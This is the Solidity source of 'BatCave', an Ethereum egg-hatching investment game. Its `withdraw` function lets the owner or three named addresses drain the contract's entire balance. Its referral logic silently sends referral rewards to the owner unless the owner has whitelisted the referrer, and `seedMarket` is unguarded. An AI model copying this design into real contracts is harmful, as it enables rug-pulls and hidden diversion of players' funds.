pragma solidity ^0.4.18;

library SafeMath {

    /**
     * @dev Multiplies two numbers, throws on overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
     * @dev Integer division of two numbers, truncating the quotient.
     */
    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn&#39;t hold
        return c;
    }

    /**
     * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
     */
    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
     * @dev Adds two numbers, throws on overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
contract Ownable {
  address public owner;


  /**
   * @dev The Ownable constructor sets the original `owner` of the contract to the sender
   * account.
   */
  function Ownable() public {
    owner = msg.sender;
  }


  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }


  /**
   * @dev Allows the current owner to transfer control of the contract to a newOwner.
   * @param newOwner The address to transfer ownership to.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    if (newOwner != address(0)) {
      owner = newOwner;
    }
  }

}

contract Pausable is Ownable {
  event Pause();
  event Unpause();

  bool public paused = false;


  /**
   * @dev modifier to allow actions only when the contract IS paused
   */
  modifier whenNotPaused() {
    require(!paused);
    _;
  }

  /**
   * @dev modifier to allow actions only when the contract IS NOT paused
   */
  modifier whenPaused {
    require(paused);
    _;
  }

  /**
   * @dev called by the owner to pause, triggers stopped state
   */
  function pause() public onlyOwner whenNotPaused returns (bool) {
    paused = true;
    return true;
  }

  /**
   * @dev called by the owner to unpause, returns to normal state
   */
  function unpause() public onlyOwner whenPaused returns (bool) {
    paused = false;
    return true;
  }
}

contract BatCave is Pausable {
    // total eggs one bat can produce per day
    uint256 public EGGS_TO_HATCH_1BAT = 86400;
    // how much bat for newbie user
    uint256 public STARTING_BAT = 300;
    uint256 PSN = 10000;
    uint256 PSNH = 5000;
    address public batman;
    address public superman;
    address public aquaman;
    mapping(address => uint256) public hatcheryBat;
    mapping(address => uint256) public claimedEggs;
    mapping(address => uint256) public lastHatch;
    mapping(address => address) public referrals;
    mapping (address => uint256) realRef;


    // total eggs in market
    uint256 public marketEggs;

    function BatCave() public{
        paused = false;
    }

    modifier onlyDCFamily() {
      require(batman!=address(0) && superman!=address(0) && aquaman!=address(0));
      require(msg.sender == owner || msg.sender == batman || msg.sender == superman || msg.sender == aquaman);
      _;
    }

    function setBatman(address _bat) public onlyOwner{
      require(_bat!=address(0));
      batman = _bat;
    }

    function setSuperman(address _bat) public onlyOwner{
      require(_bat!=address(0));
      superman = _bat;
    }

    function setAquaman(address _bat) public onlyOwner{
      require(_bat!=address(0));
      aquaman = _bat;
    }

    function setRealRef(address _ref,uint256 _isReal) public onlyOwner{
        require(_ref!=address(0));
        require(_isReal==0 || _isReal==1);
        realRef[_ref] = _isReal;
    }

    function withdraw(uint256 _percent) public onlyDCFamily {
        require(_percent>0&&_percent<=100);
        uint256 val = SafeMath.div(SafeMath.mul(address(this).balance,_percent), 300);
        if (val>0){
          batman.transfer(val);
          superman.transfer(val);
          aquaman.transfer(val);
        }
    }

    // hatch eggs into bats
    function hatchEggs(address ref) public whenNotPaused {
        // set user&#39;s referral only if which is empty
        if (referrals[msg.sender] == address(0) && referrals[msg.sender] != msg.sender) {
            //referrals[msg.sender] = ref;
            if (realRef[ref] == 1){
                referrals[msg.sender] = ref;
            }else{
                referrals[msg.sender] = owner;
            }

        }
        uint256 eggsUsed = getMyEggs();
        uint256 newBat = SafeMath.div(eggsUsed, EGGS_TO_HATCH_1BAT);
        hatcheryBat[msg.sender] = SafeMath.add(hatcheryBat[msg.sender], newBat);
        claimedEggs[msg.sender] = 0;
        lastHatch[msg.sender] = now;

        //send referral eggs 20% of user
        //claimedEggs[referrals[msg.sender]] = SafeMath.add(claimedEggs[referrals[msg.sender]], SafeMath.div(eggsUsed, 5));
        claimedEggs[referrals[msg.sender]] = SafeMath.add(claimedEggs[referrals[msg.sender]], SafeMath.div(eggsUsed, 3));

        //boost market to nerf bat hoarding
        // add 10% of user into market
        marketEggs = SafeMath.add(marketEggs, SafeMath.div(eggsUsed, 10));
    }

    // sell eggs for eth
    function sellEggs() public whenNotPaused {
        uint256 hasEggs = getMyEggs();
        uint256 eggValue = calculateEggSell(hasEggs);
        uint256 fee = devFee(eggValue);
        // kill one third of the owner&#39;s snails on egg sale
        hatcheryBat[msg.sender] = SafeMath.mul(SafeMath.div(hatcheryBat[msg.sender], 3), 2);
        claimedEggs[msg.sender] = 0;
        lastHatch[msg.sender] = now;
        marketEggs = SafeMath.add(marketEggs, hasEggs);
        owner.transfer(fee);
        msg.sender.transfer(SafeMath.sub(eggValue, fee));
    }

    function buyEggs() public payable whenNotPaused {
        uint256 eggsBought = calculateEggBuy(msg.value, SafeMath.sub(address(this).balance, msg.value));
        eggsBought = SafeMath.sub(eggsBought, devFee(eggsBought));
        owner.transfer(devFee(msg.value));
        claimedEggs[msg.sender] = SafeMath.add(claimedEggs[msg.sender], eggsBought);
    }
    //magic trade balancing algorithm
    function calculateTrade(uint256 rt, uint256 rs, uint256 bs) public view returns(uint256) {
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return SafeMath.div(SafeMath.mul(PSN, bs), SafeMath.add(PSNH, SafeMath.div(SafeMath.add(SafeMath.mul(PSN, rs), SafeMath.mul(PSNH, rt)), rt)));
    }

    // eggs to eth
    function calculateEggSell(uint256 eggs) public view returns(uint256) {
        return calculateTrade(eggs, marketEggs, address(this).balance);
    }

    function calculateEggBuy(uint256 eth, uint256 contractBalance) public view returns(uint256) {
        return calculateTrade(eth, contractBalance, marketEggs);
    }

    function calculateEggBuySimple(uint256 eth) public view returns(uint256) {
        return calculateEggBuy(eth, address(this).balance);
    }

    // eggs amount to eth for developers: eggs*4/100
    function devFee(uint256 amount) public pure returns(uint256) {
        return SafeMath.div(SafeMath.mul(amount, 4), 100);
    }

    // add eggs when there&#39;s no more eggs
    // 864000000 with 0.02 Ether
    function seedMarket(uint256 eggs) public payable {
        require(marketEggs == 0);
        marketEggs = eggs;
    }

    function getFreeBat() public payable whenNotPaused {
        require(msg.value == 0.001 ether);
        require(hatcheryBat[msg.sender] == 0);
        lastHatch[msg.sender] = now;
        hatcheryBat[msg.sender] = STARTING_BAT;
        owner.transfer(msg.value);
    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }

    function getMyBat() public view returns(uint256) {
        return hatcheryBat[msg.sender];
    }

    function getMyEggs() public view returns(uint256) {
        return SafeMath.add(claimedEggs[msg.sender], getEggsSinceLastHatch(msg.sender));
    }

    function getEggsSinceLastHatch(address adr) public view returns(uint256) {
        uint256 secondsPassed = min(EGGS_TO_HATCH_1BAT, SafeMath.sub(now, lastHatch[adr]));
        return SafeMath.mul(secondsPassed, hatcheryBat[adr]);
    }

    function min(uint256 a, uint256 b) private pure returns(uint256) {
        return a < b ? a : b;
    }
}